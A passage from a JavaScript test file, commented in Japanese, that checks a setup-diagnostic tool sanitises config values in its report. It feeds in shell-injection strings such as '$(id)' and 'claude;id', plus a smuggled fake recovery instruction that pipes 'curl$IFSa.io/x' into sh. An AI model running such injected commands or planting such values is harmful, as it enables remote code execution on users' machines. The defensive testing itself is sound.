        /Claude Code でこのリポジトリを開き/,
      );
    },
  );
});

test('formatDoctorReport: 別マシン構成でも claude が入っていれば従来の締めに戻る', () => {
  withDoctorEnv(
    {
      terminalsMode: 'vk-terminals',
      vkTerminalsApiHost: '100.64.0.2',
      claudeInstalled: true,
      queueBackend: 'local',
    },
    (options) => {
      const report = formatDoctorReport(runDoctor(options));
      assert.match(report, /Claude Code でこのリポジトリを開き `\/vk-orchestrator-setup` を実行すると/);
      assert.doesNotMatch(report, /は手元の Claude Code で実行します/);
    },
  );
});

test('formatDoctorReport: claude 未充足なら /vk-orchestrator-setup ではなく先に導入を促す（詰みループ回避）', () => {
  // Claude Code が無いから ❌ が出ている人に「Claude Code で開いて /vk-orchestrator-setup」と
  // 案内すると実行不可能で、この機能が救おうとしている当事者が二度目の壁にぶつかる。
  withDoctorEnv({ queueBackend: 'local', claudeInstalled: false, allowedOwners: ['vektor-inc'] }, (options) => {
    const report = formatDoctorReport(runDoctor(options));
    assert.match(report, /まず Claude Code をインストールしてください/);
    assert.match(report, /導入後、Claude Code でこのリポジトリを開き/);
  });
});

test('formatDoctorReport: 独自コマンドが見つからない場合はインストールを勧めない', () => {
  // 独自コマンド（cly 等）が無いだけなら Claude Code 自体は入っていることが多く、
  // インストールを勧めても解決しない。締めでも hint と同じ優先順位を守る。
  withDoctorEnv(
    { terminalsMode: 'tmux', queueBackend: 'local', config: { tmux: { claudeCommand: 'cly' } }, claudeInstalled: false, allowedOwners: ['vektor-inc'] },
    (options) => {
      const report = formatDoctorReport(runDoctor(options));
      assert.doesNotMatch(report, /まず Claude Code をインストールしてください/);
      assert.match(report, /まず上記の「Claude Code コマンド導入」を解消してください/);
    },
  );
});

test('formatDoctorReport: claude が充足していれば従来どおり /vk-orchestrator-setup へ誘導する', () => {
  withDoctorEnv({ queueBackend: 'github', config: {}, ghAuthenticated: false, claudeInstalled: true }, (options) => {
    const report = formatDoctorReport(runDoctor(options));
    assert.doesNotMatch(report, /まず Claude Code をインストールしてください/);
    assert.match(report, /Claude Code でこのリポジトリを開き `\/vk-orchestrator-setup` を実行すると/);
  });
});

test('runDoctor: claude --version の出力は先頭行・制御文字除去・長さ制限してから current に入れる', () => {
  withDoctorEnv({ queueBackend: 'local', allowedOwners: ['vektor-inc'] }, (options) => {
    // 改行で偽の ✅ 行を混ぜ込む／ANSI エスケープ／長すぎる出力を注入する。
    options.resolveClaudeVersion = () =>
      `\u001b[32m2.0.14 (Claude Code)\u0007\u001b[0m\n  ✅ 偽の要件行（必須） … なりすまし\n${'x'.repeat(500)}`;
    const claude = byId(runDoctor(options), 'claude');
    assert.equal(claude.current, '2.0.14 (Claude Code)');
    assert.equal(claude.ok, true);
    // レポートに偽の行が混ざらないこと。
    assert.doesNotMatch(formatDoctorReport(runDoctor(options)), /偽の要件行/);
  });
});

test('runDoctor: tmux.claudeCommand が制御文字入りでもレポート行を壊さない', () => {
  // 設定値は current / hint に出るため、そこから偽の要件行を混ぜ込めないこと。
  // 実際にここを守っているのは先頭トークン抽出（split(/\s+/)）で、改行以降は
  // その時点で落ちる。制御文字の除去はそれをすり抜ける値への多層防御。
  withDoctorEnv(
    {
      terminalsMode: 'tmux',
      config: { tmux: { claudeCommand: 'my-claude\n  ✅ 偽の要件行（必須） … なりすまし' } },
      claudeInstalled: false,
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const reqs = runDoctor(options);
      assert.equal(byId(reqs, 'claude').ok, false);
      assert.doesNotMatch(formatDoctorReport(reqs), /偽の要件行/);
    },
  );
});

test('runDoctor: tmux.claudeCommand にシェルの特殊文字が含まれるとコピペ用コマンドを出さない（issue #253）', () => {
  // hint は「そのままターミナルに貼ってください」という文脈で読まれるため、設定ファイル
  // 由来の値を `<設定値> --version` の形でコマンド行に埋めると、細工された設定を含む
  // リポジトリを clone した人が案内どおりに貼った時点で意図しないコマンドが動く。
  // doctor 自身の実行経路（execFileSync）で防げるのは値に含まれるシェルのメタ文字の解釈
  // だけで、値そのものは実行されるし、tmux ペインの起動は backend-tmux.js が `sh -c` へ
  // 渡す設計。ここで潰すのは表示（コマンド行の提示）だけで、実行経路の安全性は別問題。
  //
  // 検証値は空白を含まない 1 語にする。先頭トークン抽出（split(/\s+/)）で落ちてしまうと、
  // 「防げている」ように見えて実際は素通しの実装でもテストが通ってしまうため。
  for (const claudeCommand of ['claude`id`', '$(id)', 'claude;id', 'claude|id', 'claude&&id']) {
    withDoctorEnv(
      {
        terminalsMode: 'tmux',
        config: { tmux: { claudeCommand } },
        claudeInstalled: false,
        allowedOwners: ['vektor-inc'],
      },
      (options) => {
        const claude = byId(runDoctor(options), 'claude');
        assert.equal(claude.ok, false);
        // コピペ用のコマンド行（バッククォートで囲った `<設定値> --version`）を出さないこと。
        assert.ok(
          !claude.hint.includes(`\`${claudeCommand} --version\``),
          `コピペ用コマンドを提示しないこと（実際の hint: ${claude.hint}）`,
        );
        // 「動くか確認してください」型の、実行を促す案内自体を出さないこと。
        assert.doesNotMatch(claude.hint, /が動くか確認してください/);
        // 代わりに、なぜコマンドを出さないのか＋どこを直すのかを伝えること。
        // 表示値は 64 文字で切り詰められるため「表示されている値」を主語にすると、長い値で
        // 「特別な文字が見えないのに含まれると言われる」矛盾が起きる。主語は設定値にする。
        assert.match(claude.hint, /設定されている値が、実行ファイル名やパスとして扱える文字だけで書かれていない/);
        assert.match(claude.hint, /tmux\.claudeCommand/);
        // 値そのものの表示は残す（config.json のどの値を直すのか特定できないと直せない）。
        // 括りは JSON.stringify（手書きの "…" だと値に " を入れて引用符の外へ出られる）。
        assert.ok(
          claude.hint.includes(JSON.stringify(claudeCommand)),
          `どの値が問題かを表示すること（実際の hint: ${claude.hint}）`,
        );
        // 実行される値でもあるので、「放置してよい」と読ませない一言まで出すこと
        // （backend-tmux.js は tmux ペインの起動でこの値を `sh -c` に渡す）。
        assert.match(claude.hint, /設定した覚えのない値なら/);
        // 安全側と同じ「何が見つからないか → 打つ手」の型で始めること。
        assert.match(claude.hint, /^ペイン起動に使うコマンド /);
        // 実際に人が読む面（doctor のレポート／`up` の未充足警告は同じ hint を出す）でも
        // コマンド行が現れないこと。コピペされるのはこちらなので、要件単体だけでなく
        // 出力まで見て固定する。
        assert.ok(
          !formatDoctorReport(runDoctor(options)).includes(`\`${claudeCommand} --version\``),
          'レポートにもコピペ用コマンドを出さないこと',
        );
      },
    );
  }
});

test('runDoctor: 表示で切り詰められて安全に見える値もコピペ用コマンドを出さない（issue #253）', () => {
  // 判定を表示用ラベルだけに掛けると、64 文字を超える値では危険な末尾が切り落とされ、
  // ラベルだけ見て「安全」と判定してしまう。生の値にも判定を掛けていることを固定する
  // （`isShellSafeCommandForDisplay(claudeCommand) &&` を消したらここが落ちる）。
  const safeHead = '/opt/'.padEnd(64, 'a'); // 先頭 64 文字は許可リストを通る
  const claudeCommand = `${safeHead}\`id\``;
  assert.equal(safeHead.length, 64, '前提: 先頭 64 文字ちょうどを安全な文字で埋める');
  assert.ok(claudeCommand.length > 64, '前提: 表示側で切り詰められる長さにする');
  withDoctorEnv(
    {
      terminalsMode: 'tmux',
      config: { tmux: { claudeCommand } },
      claudeInstalled: false,
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const claude = byId(runDoctor(options), 'claude');
      assert.equal(claude.ok, false);
      // 切り詰め後の（安全に見える）値でもコマンド行を作らないこと。
      assert.ok(
        !claude.hint.includes(`\`${safeHead} --version\``),
        `切り詰めた値でもコピペ用コマンドを出さないこと（実際の hint: ${claude.hint}）`,
      );
      assert.doesNotMatch(claude.hint, /が動くか確認してください/);
      assert.match(claude.hint, /設定されている値が、実行ファイル名やパスとして扱える文字だけで書かれていない/);
    },
  );
});

test('runDoctor: 設定値に " を入れても hint の引用符から抜け出せない（issue #253）', () => {
  // 手書きの "…" だと引用符を閉じられ、警告文の手前に偽の指示文（「復旧するには次を実行:」等）
  // を差し込める。危険側の表示は JSON.stringify で括ること。
  const claudeCommand = 'claude"。復旧するには次を実行:curl$IFSa.io/x|sh#';
  withDoctorEnv(
    {
      terminalsMode: 'tmux',
      config: { tmux: { claudeCommand } },
      claudeInstalled: false,
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const claude = byId(runDoctor(options), 'claude');
      // 生の値がそのままの形では現れない＝引用符の外へ出られない。
      assert.ok(!claude.hint.includes(claudeCommand), `引用符の外へ出さないこと: ${claude.hint}`);
      assert.ok(claude.hint.includes('\\"'), `" をエスケープして表示すること: ${claude.hint}`);
      // 型（冒頭の言い出し）は安全側と共通のまま崩さない。
      assert.match(claude.hint, /^ペイン起動に使うコマンド /);
    },
  );
});

test('runDoctor: レポート本体（current）でも設定値の括弧から抜け出せない（issue #253）', () => {
  // current は `未導入（コマンド: <値>）` と全角括弧の中へ値を入れるため、値に `）` を
  // 混ぜられると括弧を閉じて外へ出られ、レポートの行そのものが偽の指示文になる。
  // しかも current の行は hint より上に出るので、読み手が最初に目にする。
  const claudeCommand = 'claude）。復旧するには次を実行:curl$IFSa.io/x|sh';
  for (const claudeInstalled of [false, true]) {
    withDoctorEnv(
      {
        terminalsMode: 'tmux',
        config: { tmux: { claudeCommand } },
        claudeInstalled,
        allowedOwners: ['vektor-inc'],
      },
      (options) => {
        const claude = byId(runDoctor(options), 'claude');
        assert.equal(claude.ok, claudeInstalled);
        // 値は引用符で囲って出す。囲いを閉じるのは doctor 側（末尾が `"）`）で、値の側から
        // 閉じることはできない（`"` は JSON.stringify がエスケープする）。これで値の
        // どこまでが設定値なのかが読み手に分かり、「（コマンド: …）」の外に出た体裁の
        // 偽の指示文を作れなくなる。
        assert.match(claude.current, /（コマンド: "/);
        assert.ok(
          claude.current.endsWith('"）'),
          `囲いは doctor 側で閉じること（実際: ${claude.current}）`,
        );
        assert.ok(
          claude.current.includes(JSON.stringify(claudeCommand)),
          `どの値が問題かは引用符込みで示すこと（実際: ${claude.current}）`,
        );
      },
    );
  }
});

test('runDoctor: current に " を入れても引用符の外へ出られない（issue #253）', () => {
  // ✅ 側でも同じであること。ok の行は読み手の警戒が下がる分、偽の指示文を混ぜられた
  // ときに効いてしまうので、未導入側と同じ扱いに揃える。
  const claudeCommand = 'claude"）。復旧するには次を実行:curl$IFSa.io/x|sh';
  for (const claudeInstalled of [false, true]) {
    withDoctorEnv(
      {
        terminalsMode: 'tmux',
        config: { tmux: { claudeCommand } },
        claudeInstalled,
        allowedOwners: ['vektor-inc'],
      },
      (options) => {
        const reqs = runDoctor(options);
        const claude = byId(reqs, 'claude');
        // 生の値がそのままの形では現れない＝引用符を閉じて外へ出られない。
        assert.ok(
          !claude.current.includes(claudeCommand),
          `current で引用符の外へ出さないこと（実際: ${claude.current}）`,
        );
        assert.ok(claude.current.includes('\\"'), `" をエスケープすること（実際: ${claude.current}）`);
        // ✅ で終わる（未充足リストも hint も出ない）レポートでも同じであること。
        assert.ok(
          !formatDoctorReport(reqs).includes(claudeCommand),
          'レポート本体にも生の値を出さないこと',
        );
      },
    );
  }
});

test('runDoctor: 正常な独自コマンドでは current の表示を従来どおり素のまま出す（issue #253）', () => {
  // 危険側だけ JSON.stringify に切り替えるので、通常運用の表示は 1 文字も変わらないこと。
  withDoctorEnv(
    {
      terminalsMode: 'tmux',
      config: { tmux: { claudeCommand: 'my-claude' } },
      claudeInstalled: true,
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const claude = byId(runDoctor(options), 'claude');
      assert.equal(claude.current, '2.0.14 (Claude Code)（コマンド: my-claude）');
    },
  );
});

test('runDoctor: 実行ファイル名・絶対パスとして正常な値では従来どおりコピペ用コマンドを出す（issue #253）', () => {
  // 許可リスト判定が過剰に効いて、正しく設定できている人の案内まで削らないことの担保。
  // fnm / volta 配下の絶対パスや、バージョン番号入りのディレクトリ名も安全側に残す。
  //
  // 検証値は表示用の長さ制限（sanitizeReportValue の 64 文字）に収まるものだけを使う。
  // それを超える値が表示側で切り詰められるのは #253 とは別の既存挙動なので、ここでは
  // 「文字種の判定が過剰でないこと」だけを見る。
  for (const claudeCommand of [
    'my-claude',
    '/opt/homebrew/bin/claude',
    '/Users/someuser/.local/share/fnm/v20.11.0/bin/claude',
    'claude_2.0',
  ]) {
    withDoctorEnv(
      {
        terminalsMode: 'tmux',
        config: { tmux: { claudeCommand } },
        claudeInstalled: false,
        allowedOwners: ['vektor-inc'],
      },
      (options) => {
        const claude = byId(runDoctor(options), 'claude');
        assert.equal(claude.ok, false);
        assert.ok(
          claude.hint.includes(`\`${claudeCommand} --version\``),
          `コピペ用コマンドを従来どおり出すこと（実際の hint: ${claude.hint}）`,
        );
        assert.doesNotMatch(claude.hint, /シェルで特別な意味を持つ文字/);
      },
    );
  }
});

test('runDoctor: terminals.mode を options ではなく config から解決する', () => {
  withDoctorEnv({ config: { terminals: { mode: 'tmux' } }, allowedOwners: ['vektor-inc'] }, (options) => {
    // terminalsMode を明示注入しない（config から読む。env はヘルパ側で外している）。
    delete options.terminalsMode;
    const reqs = runDoctor(options);
    assert.equal(byId(reqs, 'terminals.mode').current, 'tmux');
    assert.equal(byId(reqs, 'vk-terminals').required, false);
    assert.equal(byId(reqs, 'tmux').required, true);
  });
});

test('runDoctor: Node 20 未満・非対応プラットフォームは ok=false になる', () => {
  withDoctorEnv({ nodeVersion: '18.20.0', platform: 'win32', allowedOwners: ['vektor-inc'] }, (options) => {
    const reqs = runDoctor(options);
    assert.equal(byId(reqs, 'node').ok, false);
    assert.equal(byId(reqs, 'platform').ok, false);
  });
});

test('runDoctor: github.owner 未設定は ok=false・既定 vektor-inc を表示する', () => {
  withDoctorEnv({ queueBackend: 'github', config: {}, allowedOwners: ['vektor-inc'] }, (options) => {
    const owner = byId(runDoctor(options), 'github.owner');
    assert.equal(owner.ok, false);
    assert.match(owner.current, /vektor-inc/);
  });
});

test('runDoctor: github.owner を設定すると ok=true になる', () => {
  withDoctorEnv({ queueBackend: 'github', config: { github: { owner: 'acme' } }, allowedOwners: ['acme'] }, (options) => {
    const owner = byId(runDoctor(options), 'github.owner');
    assert.equal(owner.ok, true);
    assert.equal(owner.current, 'acme');
  });
});

test('runDoctor: owner が allowed_owners に含まれれば ok=true（プリフィル済み想定）', () => {
  withDoctorEnv({ config: { github: { owner: 'acme' } }, allowedOwners: ['acme'] }, (options) => {
    assert.equal(byId(runDoctor(options), 'org.allowed_owners').ok, true);
  });
});

test('runDoctor: owner が allowed_owners に含まれなければ ok=false', () => {
  withDoctorEnv({ config: { github: { owner: 'acme' } }, allowedOwners: ['vektor-inc'] }, (options) => {
    const owners = byId(runDoctor(options), 'org.allowed_owners');
    assert.equal(owners.ok, false);
    assert.match(owners.label, /acme/);
  });
});

test('runDoctor: canonical config が無い（allowed_owners 未設定）と ok=false・current 未設定', () => {
  withDoctorEnv({ config: { github: { owner: 'acme' } } }, (options) => {
    const owners = byId(runDoctor(options), 'org.allowed_owners');
    assert.equal(owners.ok, false);
    assert.equal(owners.current, '（未設定）');
  });
});

test('runDoctor: 既定 owner(vektor-inc) は allowed_owners=[vektor-inc] で ok=true', () => {
  withDoctorEnv({ config: {}, allowedOwners: ['vektor-inc'] }, (options) => {
    assert.equal(byId(runDoctor(options), 'org.allowed_owners').ok, true);
  });
});

test('runDoctor: assigneeFilter は空だと ok=false、値があると ok=true', () => {
  withDoctorEnv({ queueBackend: 'github', config: {}, allowedOwners: ['vektor-inc'] }, (options) => {
    assert.equal(byId(runDoctor(options), 'orchestrator.assigneeFilter').ok, false);
  });
  withDoctorEnv({ queueBackend: 'github', config: { orchestrator: { assigneeFilter: 'all' } }, allowedOwners: ['vektor-inc'] }, (options) => {
    const af = byId(runDoctor(options), 'orchestrator.assigneeFilter');
    assert.equal(af.ok, true);
    assert.equal(af.current, 'all');
  });
});

// ---------------------------------------------------------------------------
// 設定値の表示サニタイズ（issue #248）
//
// config から読んだ値をそのままレポートへ載せると、改行入りの値で行構造が崩れ、
// 「✅ ○○（必須） … 充足」のような存在しない行を混ぜ込める（読んだ人が「必須項目は
// 足りている」と誤読しうる）。表示だけをサニタイズし、合否判定は生の値のまま行う。
// ---------------------------------------------------------------------------

// C0/C1 制御文字（src/engine/build-command.js の stripControlChars と同じ範囲）が
// 含まれていないかをコードポイントで判定する。テスト側に文字クラスを複製せず、
// テストソースへ生の制御文字を書かないための書き方。
function hasControlChars(value) {
  return [...String(value)].some((ch) => {
    const code = ch.codePointAt(0);
    return code <= 0x1f || (code >= 0x7f && code <= 0x9f);
  });
}

// ANSI エスケープ／BEL も同じ理由でコードポイントから作る。
const ESC = String.fromCharCode(0x1b);
const BEL = String.fromCharCode(0x07);

// レポート中の要件行（`  ✅ ラベル（必須） … 値`）の数。
// 偽の行が混ざれば要件数と合わなくなるので、行構造そのものの検証に使う。
function countRequirementLines(report) {
  return report.split('\n').filter((line) => /^ {2}(?:✅|❌|⚠️) /.test(line)).length;
}

// 改行で行を割り、その先に「充足済みの必須項目」を装う 1 行を足す注入文字列。
const FAKE_LINE = '  ✅ 偽の必須項目（必須） … 充足';

test('runDoctor: 制御文字入りの設定値は current / label / hint から除去する（issue #248）', () => {
  withDoctorEnv(
    {
      queueBackend: 'github',
      config: {
        github: { owner: `acme\n${FAKE_LINE}`, repo: `queue\r${BEL}${FAKE_LINE}` },
        orchestrator: { assigneeFilter: `me${ESC}[31m\n${FAKE_LINE}` },
      },
      allowedOwners: [`acme\n${FAKE_LINE}`, 'other-owner'],
    },
    (options) => {
      const reqs = runDoctor(options);
      for (const r of reqs) {
        for (const field of ['current', 'label', 'hint']) {
          assert.ok(!hasControlChars(r[field]), `${r.id} の ${field} に制御文字が残らないこと`);
        }
      }
      // ANSI の残骸（ESC を落としただけの `[31m`）も表示に残さない。
      assert.doesNotMatch(byId(reqs, 'orchestrator.assigneeFilter').current, /\[31m/);
      // 値そのものは（切り詰めずに）残っていること。
      assert.match(byId(reqs, 'github.owner').current, /^acme/);
      assert.match(byId(reqs, 'github.repo').current, /^queue/);
      assert.match(byId(reqs, 'orchestrator.assigneeFilter').current, /^me/);
    },
  );
});

test('formatDoctorReport: 制御文字入りの設定値でも偽の要件行が現れない（issue #248）', () => {
  // 同じ構成をクリーンな値でも作り、行数・要件行数が一致することで
  // 「レポートの行構造が変わっていない」を検証する（文字列除去だけの確認で終わらせない）。
  const buildReport = (injected) =>
    withDoctorEnv(
      {
        queueBackend: 'github',
        config: {
          github: {
            owner: injected ? `acme\n${FAKE_LINE}` : 'acme',
            repo: injected ? `queue\n${FAKE_LINE}` : 'queue',
          },
          orchestrator: { assigneeFilter: injected ? `me\n${FAKE_LINE}` : 'me' },
        },
        // owner は allowed_owners に含めない（未充足にして label / hint も
        // `- ${label}: ${hint}` としてレポートに出す経路を通す）。
        allowedOwners: injected ? [`other\n${FAKE_LINE}`] : ['other'],
      },
      (options) => {
        const reqs = runDoctor(options);
        const summary = summarizeDoctor(reqs);
        return {
          report: formatDoctorReport(reqs, summary),
          requirementCount: reqs.length,
          missingCount: summary.missingRequired.length,
        };
      },
    );

  const clean = buildReport(false);
  const injected = buildReport(true);

  // 未充足の必須項目（org.allowed_owners）があり、label / hint の経路も通っていること。
  assert.ok(injected.missingCount > 0, '前提: 未充足の必須項目があること');
  assert.equal(injected.missingCount, clean.missingCount);

  // 行構造が注入前と変わらない＝偽の行が増えていない。増えてよいのは、加工が起きたことを
  // 知らせる固定の警告ブロック（空行 + 2 行。issue #252）だけ。
  assert.equal(injected.report.split('\n').length, clean.report.split('\n').length + 3);
  assert.equal(countRequirementLines(injected.report), injected.requirementCount);
  assert.equal(countRequirementLines(clean.report), clean.requirementCount);

  // 注入文字列が独立した行になっていないこと（実値の後ろに続く 1 行の一部なら可）。
  for (const line of injected.report.split('\n')) {
    assert.doesNotMatch(line, /^\s*✅ 偽の必須項目/, `偽の行が独立して現れないこと: ${line}`);
  }
  // 「必須項目はすべて充足しています」の締めに化けていないこと。
  assert.match(injected.report, /❌ 未充足の必須項目が/);
});

test('formatDoctorReport: U+2028 / U+2029 入りの設定値も除去する（ブラウザ表示で行が割れる）', () => {
  // この 2 文字は C0/C1 の範囲外なので stripControlChars では落ちない。端末では行が割れないが、
  // CSS は強制改行として扱うため、診断結果を GitHub の issue へ貼るとブラウザ上で行が割れ、
  // 偽の要件行が独立して見えてしまう。
  const LS = String.fromCharCode(0x2028); // LINE SEPARATOR
  const PS = String.fromCharCode(0x2029); // PARAGRAPH SEPARATOR
  withDoctorEnv(
    {
      queueBackend: 'github',
      config: {
        github: { owner: `acme${LS}${FAKE_LINE}`, repo: `queue${PS}${FAKE_LINE}` },
        orchestrator: { assigneeFilter: `me${LS}${FAKE_LINE}` },
      },
      // owner を含めず未充足にして、label / hint がレポートに出る経路も通す。
      allowedOwners: [`other${PS}${FAKE_LINE}`],
    },
    (options) => {
      const reqs = runDoctor(options);
      for (const r of reqs) {
        for (const field of ['current', 'label', 'hint']) {
          assert.ok(!r[field].includes(LS), `${r.id} の ${field} に U+2028 が残らないこと`);
          assert.ok(!r[field].includes(PS), `${r.id} の ${field} に U+2029 が残らないこと`);
        }
      }
      const report = formatDoctorReport(reqs);
      assert.ok(!report.includes(LS), 'レポートに U+2028 が残らないこと');
      assert.ok(!report.includes(PS), 'レポートに U+2029 が残らないこと');
      // 値そのものは（切り詰めずに）残っていること。
      assert.match(byId(reqs, 'github.owner').current, /^acme/);
      assert.match(byId(reqs, 'github.repo').current, /^queue/);
    },
  );
});

test('runDoctor: 許可オーナー一覧は長さで切り詰めない（issue #248 完了条件 2）', () => {
  // 外部コマンド出力用の 64 文字制限を流用すると、オーナー数が増えた環境で
  // 「自分のオーナー名が入っているのに見えない」という別の混乱になる。
  const owners = Array.from({ length: 10 }, (_, i) => `owner-${String(i).padStart(2, '0')}-organization`);
  withDoctorEnv(
    { queueBackend: 'github', config: { github: { owner: owners[0] } }, allowedOwners: owners },
    (options) => {
      const current = byId(runDoctor(options), 'org.allowed_owners').current;
      assert.ok(current.length > 64, '前提: 検証には 64 文字超の一覧を使う');
      // 要素は引用符で括るが（issue #260）、件数も値も落とさない。
      assert.equal(current, owners.map((owner) => `"${owner}"`).join(', '));
    },
  );
});

test('runDoctor: 制御文字入り owner は allowed_owners に一致させない（fail-close を維持）', () => {
  // 表示用にサニタイズした値（"vektor-inc"）で比較すると許可ゲートが通ってしまう。
  // 判定は生の値で行い、ok=false のまま（fail-close）であること。
  withDoctorEnv(
    { queueBackend: 'github', config: { github: { owner: 'vek\ntor-inc' } }, allowedOwners: ['vektor-inc'] },
    (options) => {
      const reqs = runDoctor(options);
      const owners = byId(reqs, 'org.allowed_owners');
      assert.equal(owners.ok, false);
      // 表示は 1 行へ整えられる（判定と表示が別物であることの確認）。
      assert.match(owners.label, /"vektor-inc"/);
      assert.ok(!hasControlChars(owners.hint));
      // github.owner 側の充足判定も従来どおり生の値で行う。
      // **#261 の境界はここ**: 制御文字が「混ざっているだけ」（除去後に文字が残る）値は
      // 従来どおり充足のまま。未充足へ倒すのは「除去すると 1 文字も残らない」値だけ。
      assert.equal(byId(reqs, 'github.owner').ok, true);
      // 表示は整形済みの値 ＋ 加工したことの注記（issue #252。注記の中身はそちらのテストで検証）。
      assert.match(byId(reqs, 'github.owner').current, /^vektor-inc（/);
    },
  );
});

// ---------------------------------------------------------------------------
// 表示のために加工したことの明示（issue #252）
//
// #248 で表示値のサニタイズは入ったが、加工したことが利用者に一切伝わらないため、
// 「表示は一致しているのに ❌」という自己矛盾したレポートに見え、実際の原因
// （設定ファイルに制御文字が混入している）へ辿り着けない。
// 加工が起きたときだけ、その旨をレポート／要件オブジェクトから読めるようにする。
// 合否（ok）は従来どおり生の値で判定する（加工後の値で判定すると fail-open）。
// ---------------------------------------------------------------------------

test('runDoctor: 表示のために加工した設定値には注記と displaySanitized が付く（issue #252）', () => {
  withDoctorEnv(
    { queueBackend: 'github', config: { github: { owner: 'vek\ntor-inc' } }, allowedOwners: ['vektor-inc'] },
    (options) => {
      const reqs = runDoctor(options);
      const owner = byId(reqs, 'github.owner');
      // 表示は従来どおり 1 行に整えたうえで、加工したことが分かる注記を添える。
      assert.match(owner.current, /^vektor-inc/);
      assert.match(owner.current, /制御文字を除去/);
      assert.ok(!hasControlChars(owner.current));
      // --json の消費側が文字列を読まずに判定できる真偽値。
      assert.equal(owner.displaySanitized, true);
      // 合否は生の値のまま（fail-close を維持）。
      assert.equal(owner.ok, true);
      assert.equal(byId(reqs, 'org.allowed_owners').ok, false);
    },
  );
});

test('runDoctor: 制御文字入り owner のとき org.allowed_owners が「表示は一致でも未充足」を説明する（issue #252）', () => {
  withDoctorEnv(
    { queueBackend: 'github', config: { github: { owner: 'vek\ntor-inc' } }, allowedOwners: ['vektor-inc'] },
    (options) => {
      const reqs = runDoctor(options);
      const owners = byId(reqs, 'org.allowed_owners');
      // 引用符の中は値だけに保ちつつ（注記を値の一部に読ませない）、
      // 行だけを見ても加工が分かるよう label の末尾に注記を出す。
      assert.match(owners.label, /"vektor-inc"/);
      assert.match(owners.label, /制御文字を除去/);
      assert.equal(owners.displaySanitized, true);
      // 未充足リストに出る hint で、表示と判定が食い違う理由まで説明する。
      assert.match(owners.hint, /制御文字/);
      assert.match(owners.hint, /github\.owner/);
      assert.ok(!hasControlChars(owners.hint));
      // レポート本体（未充足リスト）からも読み取れること。
      const report = formatDoctorReport(reqs);
      assert.match(report, /制御文字/);
      // 注記を足しても行構造は崩さない。
      assert.equal(countRequirementLines(report), reqs.length);
    },
  );
});

test('runDoctor: 許可オーナー一覧側が加工されたときも注記が付く（判定は素通しのまま）', () => {
  withDoctorEnv(
    {
      queueBackend: 'github',
      config: { github: { owner: 'acme' } },
      allowedOwners: ['acme', `other${BEL}`],
    },
    (options) => {
      const owners = byId(runDoctor(options), 'org.allowed_owners');
      // owner 自体はそのまま一致するので ok は true のまま。
      assert.equal(owners.ok, true);
      assert.equal(owners.displaySanitized, true);
      assert.match(owners.current, /制御文字を除去/);
    },
  );
});

test('runDoctor: vk-terminals のパスと展開済み定義の版にも注記が付く（#248 の加工対象を網羅）', () => {
  withDoctorEnv({ queueBackend: 'local', config: {}, allowedOwners: ['vektor-inc'] }, (options) => {
    const reqs = runDoctor({
      ...options,
      resolveVkTerminalsDir: () => `/path/to/vk${BEL}-terminals`,
      // semver として読めない版になるので current / hint に両方の版が載る経路を通る。
      vendoredVkAgentsVersion: `1.2${BEL}.3`,
      vkAgentsManifestSource: { sourceVersion: '1.0.0' },
    });
    const terminals = byId(reqs, 'vk-terminals');
    assert.equal(terminals.displaySanitized, true);
    assert.match(terminals.current, /制御文字を除去/);
    assert.ok(!hasControlChars(terminals.current));

    const agentsVersion = byId(reqs, 'vk-agents-version');
    assert.equal(agentsVersion.displaySanitized, true);
    assert.match(agentsVersion.current, /制御文字を除去/);
    assert.ok(!hasControlChars(agentsVersion.current));
  });
});

// オーナー名として見せられない owner を引用符に入れると、`org.allowed_owners に "" を
// 追加してください`（`{}` なら `"[object Object]" を追加してください`）という
// 「許可オーナー一覧（セキュリティ境界）へ無意味な項目を足せ」という指示になる。
// **その状態に落ちる経路は制御文字だけではない**ので、入力の型も振って不変条件を固定する。
// - 文字列以外の値は String() を通した結果が空になるとは限らない（[] は '' だが {} は
//   '[object Object]'）。「加工されたか」でも「空か」でも拾い切れないため型自体を見る。
for (const { name, owner, sanitized } of [
  { name: '制御文字のみ', owner: BEL, sanitized: true },
  // 以下は加工が起きない（＝ ownerAltered が false になる）経路。
  { name: '空配列', owner: [] },
  { name: 'オブジェクト', owner: {} },
  { name: '数値', owner: 123 },
  { name: '真偽値', owner: true },
  {
    // String(['vektor-inc']) は 'vektor-inc' に化けるため、#252 の時点では ok だけが true に
    // なり（label は「値を見せられない」側）、✅ なのに値を見せない行になっていた。
    // **#261 で判定側も揃えた**ので、いまはどちらも「使えない値」として未充足になる。
    // 値は既定オーナー名（vektor-inc）を避ける。hint 中の「書き方の例」と同じ文字列だと、
    // 「設定値を見せた」のか「例示」なのかを検査が区別できず、除外フラグが必要になるため。
    name: '要素が 1 つの配列',
    owner: ['acme'],
  },
]) {
  test(`runDoctor: owner が${name}のとき値を引用符で見せず、一覧への追加も案内しない（issue #252 レビュー指摘）`, () => {
    withDoctorEnv(
      // 一覧に 'acme' を含める（配列ケースだけ ok: true になる経路を通すため）。
      { queueBackend: 'github', config: { github: { owner } }, allowedOwners: ['vektor-inc', 'acme'] },
      (options) => {
        const reqs = runDoctor(options);
        const owners = byId(reqs, 'org.allowed_owners');
        // label には引用符を一切出さない（オーナー名として見せられる値が無いため）。
        assert.doesNotMatch(owners.label, /"/);
        // hint に引用符が出るのは「書き方の例示」だけ。**設定値そのものは引用符に入れない**
        // （`"[object Object]" を追加してください` を出さない）。生の値で確認する。
        assert.ok(
          !owners.hint.includes(`"${String(owner)}"`),
          `設定値を引用符で見せないこと: ${owners.hint}`,
        );
        // 空の引用符は書き方の例示としても出ない＝常に「設定値をそのまま見せた」痕跡。
        // 生の値を見る上の鍵では、除去後の値（制御文字のみ → 空文字）を入れた場合に当たらない。
        assert.doesNotMatch(owners.hint, /""/);
        // 引用符で見せる代わりに、どの設定値の話かを名前で示す。
        assert.match(owners.label, /^org\.allowed_owners に github\.owner の値を含む$/);
        // 一覧への追加ではなく、まず owner を直すことだけを案内する。
        assert.doesNotMatch(owners.hint, /追加してください/);
        assert.match(owners.hint, /github\.owner/);
        // 原因が「制御文字だけ」か「文字列でない」かの言い分けは **github.owner 側の hint**
        // が担う。この行は owner から派生した失敗なので、対処を二重に書かず依存だけ伝える
        // （issue #261）。文字列以外は typeof で確定して分かっているので断定し、直し方は
        // 引用符付きの形を見せる。
        const ownerRequirement = byId(reqs, 'github.owner');
        if (sanitized) {
